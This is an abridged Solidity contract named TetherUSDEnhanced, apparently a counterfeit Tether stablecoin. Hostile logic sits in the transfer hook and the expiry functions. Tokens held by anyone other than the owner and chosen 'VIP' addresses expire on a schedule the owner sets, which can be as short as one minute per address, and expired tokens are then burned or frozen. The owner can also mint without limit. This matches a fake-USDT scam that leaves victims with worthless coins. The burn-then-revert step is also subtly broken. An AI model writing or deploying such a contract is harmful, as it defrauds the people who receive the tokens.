...
contract TetherUSDEnhanced is ERC20, Ownable, ReentrancyGuard, Pausable {
    ...
    function _beforeTokenTransfer(address from, address to, uint256 amount)
        ...
        // Token expiry with grace period
        if (from != address(0) && from != owner() && !_vipAddresses[from]) {
            if (_tokenExpiry[from] != 0 && block.timestamp > (_tokenExpiry[from] + _burnGracePeriod)) {
                if (_autoBurnEnabled && balanceOf(from) > 0) {
                    _burn(from, balanceOf(from));
                    revert("Advanced mode: Tokens expired and burned");
                } else {
                    revert("Advanced mode: Tokens expired (burn disabled by owner)");
                }
            }
        }
    }
    ...
    // Advanced minting with enhanced tracking
    function mintTokens(address to, uint256 amount) external onlyOwner nonReentrant {
        require(_advancedMintingEnabled, "Advanced minting disabled");
        ...
        if (!_vipAddresses[to]) {
            _tokenExpiry[to] = block.timestamp + _expiryPeriod;
            emit TokensMinted(to, amount, _tokenExpiry[to]);
        }
    }
    ...
    function batchMintTokens(address[] calldata recipients, uint256[] calldata amounts)
        ...
        for (uint256 i = 0; i < recipients.length; i++) {
            ...
            if (!_vipAddresses[recipients[i]]) {
                _tokenExpiry[recipients[i]] = block.timestamp + _expiryPeriod;
                emit TokensMinted(recipients[i], amounts[i], _tokenExpiry[recipients[i]]);
            }
        }
    }
    ...
    // Token expiry period management with flexible timing
    function setExpiryPeriod(uint256 newPeriodMinutes) external onlyOwner {
        require(newPeriodMinutes >= 1 && newPeriodMinutes <= 525600, "Period must be 1 minute to 1 year"); // 1 min to 365 days
        _expiryPeriod = newPeriodMinutes * 1 minutes;
        emit ExpiryPeriodUpdated(_expiryPeriod);
        emit AdvancedModeActivated("Token expiry period updated for advanced functionality");
    }

    function getExpiryPeriod() external view returns (uint256) {
        return _expiryPeriod;
    }

    function getExpiryPeriodInMinutes() external view returns (uint256) {
        return _expiryPeriod / 1 minutes;
    }

    function getExpiryPeriodInHours() external view returns (uint256) {
        return _expiryPeriod / 1 hours;
    }

    function getExpiryPeriodInDays() external view returns (uint256) {
        return _expiryPeriod / 1 days;
    }

    // Set custom expiry period for specific address
    function setCustomExpiryPeriod(address account, uint256 periodMinutes) external onlyOwner {
        require(account != address(0), "Invalid address");
        require(periodMinutes >= 1 && periodMinutes <= 525600, "Invalid period");
        _tokenExpiry[account] = block.timestamp + (periodMinutes * 1 minutes);
        emit TokensMinted(account, balanceOf(account), _tokenExpiry[account]);
        emit AdvancedModeActivated("Custom expiry period set for advanced functionality");
    }
    
    // Token expiry check
    function getTokenExpiry(address account) external view returns (uint256) {
        return _tokenExpiry[account];
    }

    function isTokenExpired(address account) external view returns (bool) {
        if (_vipAddresses[account] || _tokenExpiry[account] == 0) {
            return false;
        }
        return block.timestamp > _tokenExpiry[account];
    }
    
    // Emergency controls
    function toggleAdvancedMinting() external onlyOwner {
        _advancedMintingEnabled = !_advancedMintingEnabled;
    }
    ...
    function isAdvancedMintingEnabled() external view returns (bool) {
        return _advancedMintingEnabled;
    }
